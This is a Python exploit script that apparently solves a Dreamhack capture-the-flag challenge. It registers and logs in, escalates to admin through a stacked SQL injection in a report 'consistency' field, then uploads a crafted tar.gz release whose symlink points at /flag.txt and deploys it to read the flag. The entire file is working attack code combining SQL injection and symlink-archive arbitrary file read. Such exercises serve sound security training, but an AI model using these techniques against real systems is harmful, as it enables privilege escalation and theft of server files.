import io
import json
import tarfile
import time
import requests
import re
import os

url = 'http://host3.dreamhack.games:10875/'
s = requests.Session()

# login
creds = {
    'email': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/signup', json=creds)
res = s.post(f'{url}/login', json=creds)

assert 'token' in res.json()
print("> Logged in")

token = res.json()['token']

s.headers.update({
    'Authorization': f'Bearer {token}'
})

# get admin
res = s.post(f'{url}/reports/run', json={
    'consistency': "READ COMMITTED; UPDATE accounts SET role='operator'; --"
})

assert res.json()['ok']
print("> Escalated to admin")

# symlink leak
def build_journal(tag: str, idx: int = 0) -> bytes:
    journal = {
        "version": "5",
        "dialect": "mysql",
        "entries": [
            {
                "idx": idx,
                "version": "5",
                "when": int(time.time() * 1000),
                "tag": tag,
                "breakpoints": True,
            }
        ],
    }
    return json.dumps(journal, indent=2).encode()

def add_bytes(tar: tarfile.TarFile, arcname: str, data: bytes):
    info = tarfile.TarInfo(name=arcname)
    info.size = len(data)
    info.mtime = int(time.time())
    tar.addfile(info, io.BytesIO(data))

def add_symlink(tar: tarfile.TarFile, arcname: str, linkname: str):
    info = tarfile.TarInfo(name=arcname)
    info.type = tarfile.SYMTYPE
    info.linkname = linkname
    info.mtime = int(time.time())
    tar.addfile(info)

journal_bytes = build_journal('payload', 0)

payload_file = 'payload.tar.gz'

with tarfile.open(payload_file, "w:gz") as tar:
    add_bytes(tar, "meta/_journal.json", journal_bytes)
    add_symlink(tar, 'payload.sql', '/flag.txt')

with open(payload_file, 'rb') as f:
    payload = f.read()

res = s.post(f'{url}/admin/upload-release', files={
    'pack': (payload_file, payload, 'application/zip')
})

assert res.json()['ok']
print("> Uploaded payload")

os.remove(payload_file)

# get flag
res = s.post(f'{url}/admin/deploy-release')

flag = re.findall(r'DH{.+?}', res.text)[0].strip()
print("Flag:", flag)